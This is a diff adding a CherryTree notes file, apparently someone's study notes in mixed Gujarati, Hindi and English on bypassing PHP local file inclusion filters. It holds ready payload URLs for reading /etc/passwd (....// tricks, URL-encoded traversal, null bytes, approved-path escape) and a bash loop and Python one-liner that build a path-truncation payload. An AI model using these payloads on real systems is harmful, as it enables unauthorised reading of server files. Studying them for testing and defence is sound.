@@ -1,0 +1,246 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="31" master_id="0" name="Basic Bypassing" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1751720521" ts_lastsave="1751725283">
+    <rich_text scale="h1">mai aaaje basic bypass vise sikhi lidhu ane basic bypass ma mai </rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="h3">Basic Bypasses to Break </rich_text>
+    <rich_text scale="h3" weight="heavy">Filters</rich_text>
+    <rich_text>
+jo ../ kato ../../ filter lagelu hoy to 
+1  </rich_text>
+    <rich_text weight="heavy">Non-Recursive Filter Bypass (</rich_text>
+    <rich_text family="monospace" weight="heavy">....//</rich_text>
+    <rich_text weight="heavy"> Trick)</rich_text>
+    <rich_text>
+hu be vaar badhi vastu lakih url ma ane bane aa vastu ne lidhe filter lagela hase te nikali jase ane payload ka to run thase kato fail jase
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy"> 2. URL Encoding (Bypass Bad Characters)</rich_text>
+    <rich_text>
+ jo thai sake to payload ne encode karvu ane haa encode maare burpsuit ma decoder mathi karvu 
+ </rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+ Server jab URL decode karega to </rich_text>
+    <rich_text family="monospace">../../etc/passwd</rich_text>
+    <rich_text> banega → LFI Success.
+ 
+ 
+</rich_text>
+    <rich_text scale="h3">3. </rich_text>
+    <rich_text scale="h3" weight="heavy">Approved Path Ke Andar Se Escape Karna</rich_text>
+    <rich_text>
+Kabhi kabhi app check karta hai ki file sirf </rich_text>
+    <rich_text family="monospace">./languages/</rich_text>
+    <rich_text> ke andar ho:
+</rich_text>
+    <rich_text family="monospace">if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
+    include($_GET['language']);
+}</rich_text>
+    <rich_text>
+Tu aise likh ke bypass kar sakta hai:
+</rich_text>
+    <rich_text family="monospace">./languages/../../../../etc/passwd
+</rich_text>
+    <rich_text>Yeh filter pass ho jaata hai, par path root directory tak pahuch jaata hai.
+
+</rich_text>
+    <rich_text scale="h3"> 4. </rich_text>
+    <rich_text scale="h3" weight="heavy">Appended Extension Bypass (.php)</rich_text>
+    <rich_text>
+Kabhi app automatically </rich_text>
+    <rich_text family="monospace">input.php</rich_text>
+    <rich_text> banata hai:
+
+
+</rich_text>
+    <rich_text family="monospace">include($_GET['language'] . ".php");
+</rich_text>
+    <rich_text>
+
+Toh agar tu </rich_text>
+    <rich_text family="monospace">/etc/passwd</rich_text>
+    <rich_text> likhta hai → include karta hai </rich_text>
+    <rich_text family="monospace">/etc/passwd.php</rich_text>
+    <rich_text> ❌
+
+</rich_text>
+    <rich_text scale="h4">✅ Bypass Method 1: </rich_text>
+    <rich_text scale="h4" weight="heavy">Null Byte Injection</rich_text>
+    <rich_text scale="h4"> (old PHP ≤ 5.5)</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text family="monospace">/etc/passwd%00
+</rich_text>
+    <rich_text>
+
+• </rich_text>
+    <rich_text family="monospace">%00</rich_text>
+    <rich_text> = null byte → PHP string terminate hoti hai
+
+• Final path: </rich_text>
+    <rich_text family="monospace">/etc/passwd</rich_text>
+    <rich_text> hi banta hai, </rich_text>
+    <rich_text family="monospace">.php</rich_text>
+    <rich_text> ignore ho jaata hai.
+
+
+
+</rich_text>
+    <rich_text scale="h4">✅ Bypass Method 2: </rich_text>
+    <rich_text scale="h4" weight="heavy">Path Truncation</rich_text>
+    <rich_text scale="h4"> (PHP ≤ 5.3/5.4)</rich_text>
+    <rich_text>
+PHP mein path ki max length 4096 characters thi.
+ Agar tu input string bahut lambi banaye jaise:
+
+</rich_text>
+    <rich_text family="monospace">non_existing/../../../etc/passwd/./././././././././... (4096 chars)
+</rich_text>
+    <rich_text>
+
+Toh PHP </rich_text>
+    <rich_text family="monospace">".php"</rich_text>
+    <rich_text> extension truncate kar dega — aur sirf </rich_text>
+    <rich_text family="monospace">/etc/passwd</rich_text>
+    <rich_text> hi include karega.
+👉 Yeh purana technique hai, par kaam karti hai old servers pe.
+
+
+</rich_text>
+    <rich_text scale="h3">Bonus: Multiple Slash or Dot Combinations</rich_text>
+    <rich_text>
+Linux aur PHP </rich_text>
+    <rich_text weight="heavy">ignore</rich_text>
+    <rich_text> karte hain:
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+
+
+</rich_text>
+    <rich_text scale="h2">Goal:</rich_text>
+    <rich_text>
+Bypass </rich_text>
+    <rich_text family="monospace">.php</rich_text>
+    <rich_text> appending by reaching the </rich_text>
+    <rich_text weight="heavy">maximum allowed string length (4096 characters)</rich_text>
+    <rich_text>. After that, PHP string truncate karega </rich_text>
+    <rich_text family="monospace">.php</rich_text>
+    <rich_text> ko.
+
+</rich_text>
+    <rich_text scale="h2">Auto-generate the long payload</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="h3">Bash Command:</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text family="monospace">echo -n "non_existing_directory/../../../etc/passwd/" &gt; payload.txt &amp;&amp; for i in {1..2048}; do echo -n "./" &gt;&gt; payload.txt; done
+</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text scale="h3">What this does:</rich_text>
+    <rich_text>
+• </rich_text>
+    <rich_text family="monospace">non_existing_directory/../../../etc/passwd/</rich_text>
+    <rich_text> start of path
+
+• </rich_text>
+    <rich_text family="monospace">././././...</rich_text>
+    <rich_text> repeated 2048 times (each </rich_text>
+    <rich_text family="monospace">./</rich_text>
+    <rich_text> = 2 chars 2048 = 4096 chars)
+
+•Final total: ~4096 characters
+
+
+
+</rich_text>
+    <rich_text scale="h2">Usage:</rich_text>
+    <rich_text>
+1. Run above command
+
+2. Copy contents of </rich_text>
+    <rich_text family="monospace">payload.txt</rich_text>
+    <rich_text>
+
+3. Paste in URL like this:
+
+</rich_text>
+    <rich_text family="monospace">http://target.com/index.php?language=&lt;PASTE_HERE&gt;
+</rich_text>
+    <rich_text>
+
+If </rich_text>
+    <rich_text family="monospace">.php</rich_text>
+    <rich_text> is being appended in backend, and PHP version is vulnerable, it will be truncated and file </rich_text>
+    <rich_text family="monospace">/etc/passwd</rich_text>
+    <rich_text> will be included 
+
+</rich_text>
+    <rich_text scale="h2">Bonus:</rich_text>
+    <rich_text>
+If you're scripting this or want to generate dynamically in Python:
+
+</rich_text>
+    <rich_text scale="h3">Python one-liner:</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text family="monospace">print("non_existing_directory/../../../etc/passwd/" + "./"*2048)
+</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="h2"> Important Notes:</rich_text>
+    <rich_text>
+◇ </rich_text>
+    <rich_text weight="heavy">Works only on older PHP versions (&lt;= 5.3)</rich_text>
+    <rich_text>
+
+◇ Most modern servers are patched So try only if </rich_text>
+    <rich_text family="monospace">.php</rich_text>
+    <rich_text> extension block ho raha ho
+
+◇ If server response is "file not found" but payload length is high you're close
+
+
+
+
+
+</rich_text>
+    <codebox char_offset="324" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">http://site.com/index.php?language=a....//....//....//....//etc/passwd
+</codebox>
+    <codebox char_offset="464" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">../ =&gt; %2e%2e%2f
+http://site.com/index.php?language=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+</codebox>
+    <table char_offset="1735" justification="left" col_min="600" col_max="600" col_widths="0,0">
+      <row>
+        <cell>////etc////passwd</cell>
+        <cell>/etc/passwd</cell>
+      </row>
+      <row>
+        <cell>/etc/./passwd</cell>
+        <cell>/etc/passwd</cell>
+      </row>
+      <row>
+        <cell>./././file</cell>
+        <cell>file</cell>
+      </row>
+      <row>
+        <cell>Trick</cell>
+        <cell>Final Path Equivalent</cell>
+      </row>
+    </table>
+  </node>
+</cherrytree>
